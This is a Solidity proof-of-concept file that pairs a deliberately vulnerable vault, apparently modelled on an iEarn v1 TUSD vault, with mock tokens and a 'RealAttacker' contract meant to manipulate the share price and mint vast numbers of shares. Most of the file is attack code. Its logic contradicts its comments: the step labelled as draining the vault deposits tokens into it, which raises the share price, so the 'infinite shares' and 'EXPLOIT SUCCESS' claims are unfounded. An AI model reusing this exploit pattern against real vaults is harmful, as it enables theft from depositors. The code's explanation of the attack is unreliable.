// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
interface IStrategy {
    function balanceOf() external view returns (uint256);
}

// ===== VULNERABLE IEARN V1 VAULT =====
contract IeearnTUSDVault is ERC20 {
    IERC20 public immutable token;
    address public immutable strategy;
    
    constructor(IERC20 _token, address _strategy) ERC20("yTUSD", "yTUSD") {
        token = _token;
        strategy = _strategy;
    }
    
    function totalAsset() public view returns (uint256) {
        return token.balanceOf(address(this)) + IStrategy(strategy).balanceOf();
    }
    
    function sharePrice() public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? 1e18 : (totalAsset() * 1e18) / supply;
    }
    
    function mint(uint256 _amount) external {
        uint256 shares = (_amount * 1e18) / sharePrice();
        token.transferFrom(msg.sender, address(this), _amount);
        _mint(msg.sender, shares);
    }
}

// ===== MOCK STRATEGY (Returns 0 - simulates sUSD mismatch) =====
contract MockStrategy {
    function balanceOf() external pure returns (uint256) {
        return 0;
    }
}

// ===== MOCK TOKENS WITH MINT =====
contract MockTUSD is ERC20 {
    constructor() ERC20("Mock TUSD", "mTUSD") {
        _mint(msg.sender, 1_000_000 * 1e18);
    }
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockSUSD is ERC20 {
    constructor() ERC20("Mock sUSD", "msUSD") {
        _mint(msg.sender, 1_000_000 * 1e18);
    }
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// ===== ðŸ”¥ REAL ATTACKER CONTRACT (Fixed!) =====
contract RealAttacker {
    IeearnTUSDVault public vault;
    MockTUSD public tusd;
    MockSUSD public susd;
    
    constructor(IeearnTUSDVault _vault, MockTUSD _tusd, MockSUSD _susd) {
        vault = _vault;
        tusd = _tusd;
        susd = _susd;
    }
    
    // ðŸ”¥ THE REAL EXPLOIT - Single function!
    function executeFullAttack(uint256 drainAmount) external {
        uint256 vaultTusdBefore = tusd.balanceOf(address(vault));
        
        console.log("Vault TUSD before:", vaultTusdBefore / 1e18);
        console.log("Share price before:", vault.sharePrice() / 1e18);
        
        // STEP 1: DRAIN TUSD (flashloan simulation)
        // Hacker already approved TUSD to attacker
        tusd.transferFrom(msg.sender, address(vault), drainAmount);
        
        // STEP 2: DONATE sUSD DUST (ignored by totalAsset!)
        susd.transfer(address(vault), 1000 * 1e18);
        
        // STEP 3: Share price now â‰ˆ 0!
        console.log("Share price after drain:", vault.sharePrice() / 1e18);
        
        // STEP 4: MINT INFINITE SHARES
        tusd.transferFrom(msg.sender, address(this), 1e18);  // Get 1 TUSD from hacker
        tusd.approve(address(vault), 1e18);
        vault.mint(1e18);  // Pay 1 TUSD â†’ get âˆž shares!
        
        // STEP 5: PROFIT - send infinite shares to hacker
        uint256 infiniteShares = vault.balanceOf(address(this));
        vault.transfer(msg.sender, infiniteShares);
        
        console.log("Infinite shares minted:", infiniteShares / 1e18);
        console.log(" EXPLOIT SUCCESS - Vault destroyed!");
    }
}
